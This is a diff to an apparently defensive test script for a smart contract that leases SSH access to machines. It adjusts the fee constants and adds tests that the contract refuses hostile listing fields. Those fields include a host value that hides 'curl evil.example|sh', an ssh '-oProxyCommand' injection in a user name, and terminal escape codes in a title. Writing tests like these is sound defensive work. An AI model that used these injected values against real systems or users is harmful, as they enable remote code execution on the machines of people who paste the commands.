@@ -29,7 +29,8 @@ if (about.build !== 'release') throw new Error(`Attack the release build, not ${
 
 const scratch = fs.mkdtempSync(path.join(os.tmpdir(), 'sublet-lab-'));
 const known = path.join(scratch, 'known_hosts');
-const FEE = 10n ** 22n;
+const FEE = BigInt(about.lease_fee);
+const UNIT_FEE = BigInt(about.unit_fee);
 const results = [];
 
 function record(attack, expected, got, tx, note, signer) {
@@ -66,7 +67,7 @@ const baseTerms = {
 };
 
 async function list(id, overrides = {}) {
-  const outcome = await owner.call(contract, 'list_unit', { id, terms: { ...baseTerms, ...overrides } }, { gasTera: 100, depositYocto: 2n * FEE });
+  const outcome = await owner.call(contract, 'list_unit', { id, terms: { ...baseTerms, ...overrides } }, { gasTera: 100, depositYocto: UNIT_FEE });
   if (!outcome.success) throw new Error(`could not list ${id}: ${outcome.error}`);
   return reader.view(contract, 'get_unit', { id });
 }
@@ -147,7 +148,7 @@ const sshKey = newKeyPair(path.join(scratch, 'k1'), 'lab');
 console.log('\n--- attacks on the contract ---');
 
 await refused('Pay less than the rent', 'E_UNDERPAID', stranger, 'rent',
-  { unit_id: openUnit.id, ticks: 1, ssh_key: sshKey.publicLine, source_address: null }, { depositYocto: FEE + FEE / 2n });
+  { unit_id: openUnit.id, ticks: 1, ssh_key: sshKey.publicLine, source_address: null }, { depositYocto: FEE });
 
 await refused('Ask for more time than the owner allows', 'E_BAD_TICKS', stranger, 'rent',
   { unit_id: openUnit.id, ticks: 6, ssh_key: sshKey.publicLine, source_address: null }, { depositYocto: 7n * FEE });
@@ -169,13 +170,23 @@ await refused("Pause another owner's machine", 'E_NOT_OWNER', stranger, 'set_pau
 await refused('Delist another owner\'s machine', 'E_NOT_OWNER', stranger, 'delist_unit', { id: openUnit.id });
 
 await refused('Take over a listed machine\'s name', 'E_UNIT_EXISTS', stranger, 'list_unit',
-  { id: openUnit.id, terms: { ...baseTerms, principal: 'squatter' } }, { depositYocto: 2n * FEE });
+  { id: openUnit.id, terms: { ...baseTerms, principal: 'squatter' } }, { depositYocto: UNIT_FEE });
 
 await refused('List a machine as root', 'E_ROOT_NOT_ALLOWED', stranger, 'list_unit',
-  { id: `lab-root-${stamp}`, terms: { ...baseTerms, principal: 'root' } }, { depositYocto: 2n * FEE });
+  { id: `lab-root-${stamp}`, terms: { ...baseTerms, principal: 'root' } }, { depositYocto: UNIT_FEE });
 
 await refused('List one Unix user twice, so two tenants share it', 'E_USER_ALREADY_LISTED', owner, 'list_unit',
-  { id: `lab-twice-${stamp}`, terms: baseTerms }, { depositYocto: 2n * FEE });
+  { id: `lab-twice-${stamp}`, terms: baseTerms }, { depositYocto: UNIT_FEE });
+
+// These reach a visitor's terminal: the website tells them to paste a command built from the host.
+await refused('Hide a shell command in a server address, for a visitor to paste', 'E_BAD_HOST', stranger, 'list_unit',
+  { id: `lab-paste-${stamp}`, terms: { ...baseTerms, principal: 'lab-paste', host: 'x;curl evil.example|sh' } }, { depositYocto: UNIT_FEE });
+
+await refused('Hide an ssh option in a Unix user name', 'E_BAD_PRINCIPAL', stranger, 'list_unit',
+  { id: `lab-option-${stamp}`, terms: { ...baseTerms, principal: '-oProxyCommand=evil' } }, { depositYocto: UNIT_FEE });
+
+await refused('Hide terminal escape codes in a listing', 'E_BAD_TITLE', stranger, 'list_unit',
+  { id: `lab-escape-${stamp}`, terms: { ...baseTerms, principal: 'lab-escape', title: 'Nice box\u001b]0;owned\u0007' } }, { depositYocto: UNIT_FEE });
 
 const request = await tenant.call(contract, 'rent', { unit_id: approvalUnit.id, ticks: 1, ssh_key: sshKey.publicLine, source_address: null }, { gasTera: 100, depositYocto: 2n * FEE });
 await refused('Approve your own request', 'E_NOT_OWNER', tenant, 'approve', { lease_id: request.value.id });
